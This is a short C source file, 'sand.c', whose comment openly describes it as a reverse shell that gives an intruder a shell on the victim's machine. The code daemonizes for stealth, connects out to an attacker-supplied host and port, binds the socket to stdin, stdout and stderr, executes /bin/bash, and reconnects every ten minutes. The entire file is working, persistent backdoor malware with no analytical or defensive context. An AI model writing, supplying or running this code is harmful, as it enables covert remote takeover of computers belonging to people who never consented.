/*
**           [ sand.c ]
** Copyright (c) 2016 Carson Fleming
**
** A reverse-bind shell that allows an
** intruder to obtain a shell by connecting
** to a remote server and reconnecting
** every given amount of time. The program
** daemonizes to give the program a certain
** level of stealth that should help avoid
** detection by an average user.
**
*/

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <fcntl.h>

void wait10 () {
  unsigned int tts = 600;
  while (tts) tts = sleep(tts);
}

int main (int argc, char** argv, char** envp) {
  if (argc < 3) exit(0);
  struct hostent* server = gethostbyname(argv[1]);
  if (server == 0) exit(0);

  if (daemon(0, 1) < 0) exit(0);

  struct sockaddr_in a;
  a.sin_family = AF_INET;
  memcpy(&a.sin_addr.s_addr, server->h_addr, server->h_length);
  a.sin_port = htons(atoi(argv[2]));
  while(1) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);

    while (connect(fd, (struct sockaddr*)&a, sizeof(a)) < 0) wait10();

    if (dup2(fd, fileno(stdout)) < 0) exit(0);
    if (dup2(fd, fileno(stderr)) < 0) exit(0);
    if (dup2(fd, fileno(stdin)) < 0) exit(0);

    execl("/bin/bash", "bash", (char*) 0);

    shutdown(fd, SHUT_RDWR);
    close(fd);
    wait10(); // and then start trying to connect again
  }
}
